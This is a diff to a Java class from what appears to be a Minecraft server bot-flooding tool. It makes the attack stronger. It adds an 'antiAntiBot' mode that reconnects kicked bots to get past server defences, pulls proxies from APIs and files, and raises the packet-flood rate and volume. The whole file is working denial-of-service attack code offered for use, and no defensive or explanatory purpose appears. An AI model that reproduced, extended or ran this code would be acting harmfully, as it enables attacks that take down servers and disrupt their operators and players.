@@ -41,15 +41,17 @@ public class DistributedBotAttack extends IAttack{
     private Thread tabThread;
     private Thread taskThread;
     private Thread packetFloodThread;
-    private boolean packetFlood = false;
-    public final List<TcpSession> clients= new CopyOnWriteArrayList<>();
+    private boolean antiAntiBotMode = true;
+    private boolean packetFlood;
+    public final List<TcpSession> clients = new CopyOnWriteArrayList<>();
     public ExecutorService pool=Executors.newCachedThreadPool();
 
     private long starttime;
     private ACP acp=new ACP();
-    public DistributedBotAttack(int time,int maxconnect,int joinsleep,boolean motdbefore,boolean tab,boolean packet1Flood,HashMap<String,String> modList) {
+    public DistributedBotAttack(int time,int maxconnect,int joinsleep,boolean motdbefore,boolean tab,boolean packet1Flood,HashMap<String,String> modList,boolean antiAntiBot) {
         super(time,maxconnect,joinsleep,motdbefore,tab,modList);
         this.packetFlood = packet1Flood;
+        this.antiAntiBotMode = antiAntiBot;
     }
 
     public void start(final String ip,final int port) {
@@ -65,6 +67,8 @@ public class DistributedBotAttack extends IAttack{
                         stop();
                         return;
                     }
+                    ProxyPool.getProxysFromAPIs();
+                    ProxyPool.getProxysFromFile();
                     mainUtils.log("BotThread", "连接数:"+clients.size());
                 }catch(Exception e){
                     mainUtils.log("BotThread",e.getMessage());
@@ -87,7 +91,7 @@ public class DistributedBotAttack extends IAttack{
         }
         if(this.packetFlood){
             packetFloodThread = new Thread(()->{
-                mainUtils.log("Client-Packet-Flooder-Worker","PacketFlooder started!");
+                mainUtils.log("FloodWorker","PacketFlooder started!");
                 while(true) {
                     clients.forEach(c->{
                         if(c.isConnected()) {
@@ -96,7 +100,7 @@ public class DistributedBotAttack extends IAttack{
                             }
                         }
                     });
-                    mainUtils.sleep(1000);
+                    mainUtils.sleep(500);
                 }
 
             });
@@ -114,11 +118,10 @@ public class DistributedBotAttack extends IAttack{
         if(taskThread!=null) taskThread.stop();
     }
     public void packetFlood(Session session){
-        for (int i=0;i<1000;i++){
+        for (int i=0;i<3000;i++){
             session.send(new ServerboundMoveVehiclePacket(0.01,0,0,0,0.01F));
             session.send(new ServerboundPlayerActionPacket(PlayerAction.SWAP_HANDS,new Position(0,0,0), Direction.EAST));
         }
-        mainUtils.log("Flooder","Packet sending");
     }
     public void setTask(Runnable task) {
         taskThread=new Thread(task);
@@ -160,22 +163,14 @@ public class DistributedBotAttack extends IAttack{
         });
     }
     public TcpClientSession createClient(final String ip, int port, final String username, ProxyInfo proxy) {
-
+        AtomicInteger connectCountDown = new AtomicInteger(5); //wangxyper
         TcpClientSession client=new TcpClientSession(ip,port,new MinecraftProtocol(username), proxy);
         new MCForge(client,this.modList).init();
         client.addListener(new SessionListener() {
             public void packetReceived(Session e, Packet packet) {
-                if (packet instanceof ClientboundKeepAlivePacket){
-                    mainUtils.log("Client","KeepAlive packet received!");
-                    ServerboundKeepAlivePacket keepAlivePacket = (ServerboundKeepAlivePacket)packet;
-                    long id = keepAlivePacket.getPingId()+System.currentTimeMillis();
-                    e.send(new ServerboundKeepAlivePacket(id));
-                }
                 if(packet instanceof ClientboundLoginPacket){
                     e.setFlag("join",true);
                     mainUtils.log("Client","[连接成功]["+username+"]");
-                    e.send(new ServerboundKeepAlivePacket(System.currentTimeMillis()));
-                    e.send(new ServerboundChatPacket("WDNMDWDNMDWDNMDWDNMDWDNMDWDNMD"));
                 }
             }
             @Override
@@ -193,7 +188,22 @@ public class DistributedBotAttack extends IAttack{
                 }else{
                     msg=e.getReason();
                 }
-                clients.remove(e.getSession());
+                //wangxyper --start --Use the antiAntiBot mode
+                if (antiAntiBotMode) {
+                    connectCountDown.decrementAndGet();
+                    if (connectCountDown.get() >= 0) {
+                        try {
+                            Thread.sleep(500);
+                        } catch (InterruptedException e1) {
+                            e1.printStackTrace();
+
+                        }
+                        e.getSession().connect(false);
+                    }else{
+                        clients.remove(e.getSession());
+                    }
+                }
+                //wangxyper --end
                 mainUtils.log("Client","[断开连接]["+username+"] " +msg);
             }
         });
@@ -224,6 +234,7 @@ public class DistributedBotAttack extends IAttack{
     }
 
     public void sendTab(Session session,String text) {
+        //不要用反射了
        //this code part has some wrong. I discard this code part.
        /*try {
             Class<?> cls= ClientboundTabListPacket.class;
